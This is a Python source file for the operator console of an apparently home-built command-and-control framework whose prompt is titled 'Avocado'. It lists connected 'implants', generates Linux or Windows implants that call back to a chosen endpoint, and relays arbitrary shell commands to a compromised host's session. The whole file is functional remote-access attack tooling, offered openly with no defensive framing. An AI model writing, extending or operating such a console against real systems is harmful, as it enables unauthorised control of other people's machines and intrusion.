#!/usr/bin/env python3
import os
import threading
from client.rpc_client.rpc_client import RPCClient
from client.generate.generate import generate
from queue import Queue
from client.util.util import parseEndpoint

def _help():
    print("Commands (at main prompt):")
    print("  sessions              List connected implants")
    print("  use <session_id>      Attach to an implant session (then run shell commands)")
    print("  generate <ep> <os>    Generate implant (e.g. generate 1.2.3.4:31337 linux)")
    print("  help                  Show this message")
    print("  exit                  Quit")
    print()
    print("Shell commands (ls, id, etc.) only work after 'use <session_id>'.")

class Operator:
    def __init__(self):
        addr = os.environ.get("OPERATOR_SERVER_ADDRESS")
        if not addr:
            addr = input("Enter Server Operator Listener Address (Example: 172.17.0.2:31337)\n> ")
        hostname, port = parseEndpoint(addr)

        implantq = Queue()
        outputq = Queue()

        self._rpc_client = RPCClient(hostname, port, outputq, implantq)

        # _output_received is a workaround for i/o issue
        # i.e. the server response overwrites the user input prompt
        self._output_received = threading.Event()
        self._output_received.set()

        self._sessions = []

        threading.Thread(target=self._implant_handler, args=(implantq,), daemon=True).start()
        threading.Thread(target=self._output_handler, args=(outputq,), daemon=True).start()

    # handle new implants
    def _implant_handler(self, implantq):
        while True:
            new_implant = implantq.get()

            if new_implant:
                self._sessions.append(new_implant.id)

            else:
                break

    # prints output messages received from the server
    def _output_handler(self, outputq):
        while True:
            output = outputq.get()

            if not output:
                break

            else:
                print(output[0])

            self._output_received.set() 

    def _input_handler(self, title, session_id=None):
        try:
            while True:
                self._output_received.wait()

                try:
                    msg = input(f"[{title}] > ")
                except EOFError:
                    break

                if not msg:
                    continue

                if msg.lower() == "exit":
                    print(f"[+]{title} Terminated")
                    if title == "Avocado":
                        self._rpc_client.terminate()
                    break

                elif session_id:
                    self._rpc_client.sendSession(msg, session_id)
                    self._output_received.clear()

                else:
                    command = msg.split()
                    if not command:
                        continue

                    if command[0] == "sessions":
                        if self._sessions:
                            for s in self._sessions:
                                print(s)
                        else:
                            print("No sessions. Implants will appear here when they connect.")

                    elif command[0] == "generate":
                        if len(command) != 3 or (command[2] != "linux" and command[2] != "windows"):
                            print("Usage: generate <endpoint> linux|windows")
                        else:
                            print("Generating the implant...")
                            generate(command[1], command[2])

                    elif command[0] == "use":
                        if len(command) != 2:
                            print("Usage: use <session_id>")
                        elif command[1] not in self._sessions:
                            print("Session doesn't exist. Use 'sessions' to list IDs.")
                        else:
                            self._input_handler(command[1], command[1])

                    elif command[0] == "help":
                        _help()

                    else:
                        print("Unknown command. Type 'help' for available commands.")
                        print("Use 'use <session_id>' to run shell commands on an implant.")
        except KeyboardInterrupt:
            print()
            if title == "Avocado":
                self._rpc_client.terminate()
            print("[+] Exiting.")

    def _run(self):
        self._input_handler("Avocado")


if __name__ == "__main__":
    try:
        op = Operator()
        op._run()
    except KeyboardInterrupt:
        print()
        print("[+] Exiting.")
